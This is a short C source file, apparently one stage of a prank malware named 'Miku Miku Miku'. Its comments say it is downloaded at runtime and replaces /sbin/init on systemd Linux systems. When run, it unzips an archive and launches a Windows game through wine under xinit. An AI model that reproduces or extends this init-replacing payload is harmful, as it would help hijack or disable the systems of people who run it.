#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
// This replaces /sbin/init on systemd-based Linux distros.

int main()
{
    // Let's play some Aurascope! Second to last step of the payload.
    system("cd /miku && unzip aurascope-beta-v0.3.2.zip && xinit /usr/bin/wine Aurascope.exe");

    return 0;
}
